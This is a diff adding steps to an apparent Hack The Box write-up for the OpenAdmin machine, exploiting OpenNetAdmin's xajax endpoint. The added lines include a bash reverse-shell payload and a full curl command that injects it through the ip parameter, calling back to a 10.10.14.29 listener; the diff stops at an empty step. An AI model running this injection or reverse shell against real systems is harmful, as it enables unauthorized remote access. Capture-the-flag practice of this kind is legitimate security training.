@@ -110,6 +110,29 @@ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&
 
 > Using the github POC
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/401f15c8-7ea3-4d2a-a60a-c69ba78b8e7e)
 
+
+12. Noticed we a got a shell as `www-data`, which means in order to obtain the user flag, we need to swtich to a legitimate user account.
+13. Anyway I am not too comfortable using shell from the Github POC, let's do reverse shell on our own. Let's use bash.
+
+> PAYLOAD
+
+```txt
+bash -c 'bash -i >%26 /dev/tcp/tun0/1337 0>%261'
+```
+
+> IMPLEMENTATION
+
+```txt
+curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";bash -c 'bash -i >%26 /dev/tcp/10.10.14.29/1337 0>%261';echo \"END\"&xajaxargs[]=ping" http://openadmin.htb:80/ona/ | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0d6873a0-f74e-4a4e-b140-ab3e56638b91)
+
+
+14. 
 
 
